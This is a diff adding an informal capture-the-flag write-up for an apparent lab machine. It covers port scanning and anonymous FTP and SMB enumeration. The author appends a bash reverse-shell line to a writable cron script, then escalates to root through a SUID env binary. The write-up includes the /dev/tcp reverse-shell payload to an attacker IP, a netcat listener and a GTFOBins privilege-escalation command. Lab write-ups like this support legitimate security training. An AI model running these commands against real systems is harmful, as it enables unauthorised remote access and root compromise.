@@ -1,0 +1,164 @@
+
+rustscan -a 10.10.132.237
+
+Open 10.10.132.237:22
+Open 10.10.132.237:139
+Open 10.10.132.237:21
+Open 10.10.132.237:445
+
+
+
+ftp > this was having  anonymous access
+
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
+226 Directory send OK.
+
+
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
+drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
+-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
+-rw-rw-r--    1 1000     1000          946 Jun 25 20:49 removed_files.log
+-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
+
+=========================
+
+
+└──╼ $cat clean.sh 
+#!/bin/bash
+
+tmp_files=0
+echo $tmp_files
+if [ $tmp_files=0 ]
+then
+        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
+else
+    for LINE in $tmp_files; do
+        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
+fi
+
+==========================
+
+cat removed_files.log 
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+
+
+=============================
+
+cat to_do.txt 
+I really need to disable the anonymous login...it's really not safe
+
+
+================================
+
+payload i used for rev connection(to put into clean.sh)
+
+bash -i >& /dev/tcp/10.17.12.104/4242 0>&1
+
+===============================
+
+logged in into smb 
+
+smbclient -L \\\\ip\\
+Dont type any password
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	pics            Disk      My SMB Share Directory for Pics
+	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
+
+
+accessed the pics share 
+
+smbclient \\\\10.10.110.85\\pics
+
+
+smb: \> ls
+  .                                   D        0  Sun May 17 16:41:34 2020
+  ..                                  D        0  Thu May 14 07:29:10 2020
+  corgo2.jpg                          N    42663  Tue May 12 06:13:42 2020
+  puppos.jpeg                         N   265188  Tue May 12 06:13:42 2020
+
+		20508240 blocks of size 1024. 13290424 blocks available
+
+
+downloaded both of the files in my local machine
+
+mget filename
+
+after downloading i thought of doing some binwalk extract and steghide stuff but that didnt worked ! 
+
+got into ftp again and saw the clean.sh file again it is actually removing some files from the machine and sending the name of the removed file in the removed_files.log
+
+i though of appending my rev shell into the clean.sh and wait for the rev shell!
+
+but before that i tried to remove the clean.sh file and make a new clean.sh file with my rev shell only but that didnt actually worked as we can remove the file , put the file in the ftp but we cant change it permissions so! this was a problem i resetted the machine and appended my rev shell into the clean.sh 
+
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxr-xrwx    1 1000     1000          359 Jun 25 21:09 clean.sh
+-rw-r--r--    1 111      113             8 Jun 25 21:08 h
+-rw-rw-r--    1 1000     1000         1419 Jun 25 21:20 removed_files.log
+-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
+226 Directory send OK.
+ftp> append
+(local-file) clean.sh
+(remote-file) clean.sh
+local: clean.sh remote: clean.sh
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+45 bytes sent in 0.00 secs (618.9481 kB/s)
+
+
+
+so what i did above is made a clean.sh file in my local pc with only my rev shell code and made an append command it asked me for the local file which i want to append!
+after that it asked me to which file i want to append the code ie clean.sh
+
+after that i started a rev connection listener on my other terminal
+
+nc -lvnp port
+
+and got a connection in few seconds!
+
+after that i upgraded my shell
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+and searched for suid files and got one which can be exploited to get root perms
+
+/usr/bin/env
+
+searched for it on gtfobins and got the command to get root user!
+
+/usr/bin/env /bin/sh -p
+
+uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+
+
+got the root .
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
